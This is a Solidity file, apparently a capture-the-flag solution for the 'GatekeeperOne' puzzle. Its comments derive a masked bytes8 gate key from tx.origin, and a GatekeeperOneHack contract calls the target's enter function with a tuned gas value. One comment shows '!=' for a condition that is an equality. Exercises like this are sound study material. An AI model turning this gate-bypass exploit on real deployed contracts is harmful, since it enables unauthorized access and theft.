// FIND GATEKEY
// tx.origin =  0x0E85b522423e90D2122f82Bd36511b0960A6c0A2
// _gateKey = bytes8(tx.origin) = 36 51 1b 09 60 A6 c0 A2

// Condition 1: uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)
// 60 A6 c0 A2 == c0 A2 ... false
// 60 A6 c0 A2 & 00 00 ff ff == c0 A2 ... true
// _gateKey = 60 A6 c0 A2 & 00 00 ff ff == 00 00 00 00 00 00 c0 A2 ... updated

// Condition 2: uint32(uint64(_gateKey)) != uint64(_gateKey)
// 00 00 00 00 00 00 c0 A2 != 00 00 00 00 00 00 c0 A2 ... false
// xx xx xx xx 00 00 c0 A2 != 36 51 1b 09 60 A6 c0 A2 ... true 
// _gateKey = xx xx xx xx 00 00 c0 A2 ... 

// Condition 3: uint32(uint64(_gateKey)) == uint16(tx.origin)
// 00 00 c0 A2 != c0 A2 ... true

// To be easy to generate first 4 bytes for (xx xx xx xx 00 00 c0 A2) is operating th tx.origin with some mask
// _gateKey = bytes8(tx.origin) = 36 51 1b 09 60 A6 c0 A2 & ff ff ff ff 00 00 ff ff = 36 51 1b 09 00 00 c0 A2 ... final updated

contract GatekeeperOneHack {

  address public victimAddress;
  bytes8 public gateKey = bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;


  constructor(address _victimAddress) {
        victimAddress = _victimAddress;
  }
  // Trial and Error to find gasUsed of attack() (USE REMIX DEBUGGER -> OPCODE GAS) 
  function attack(uint256 _gas) public {
   (bool success,) =  victimAddress.call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
   require(success, "Attack was not succeeded");
  }

}